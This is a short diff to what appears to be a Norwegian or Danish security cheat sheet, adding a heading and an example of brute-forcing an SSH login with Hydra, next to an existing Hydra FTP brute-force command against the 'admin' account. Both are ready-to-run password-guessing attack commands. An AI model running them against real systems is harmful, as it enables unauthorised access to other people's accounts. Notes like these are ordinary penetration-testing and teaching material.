@@ -19,3 +19,8 @@ updatedb
 ```shell
 hydra -l admin -P /usr/share/john/password.lst -vV ftplogin.com ftp
 ```
+
+#### Eksempel på bruteforce med Hydra 
+```shell
+hydra -l admin -V -x 4:4:IVXMLCD sshydra.com ssh
+```
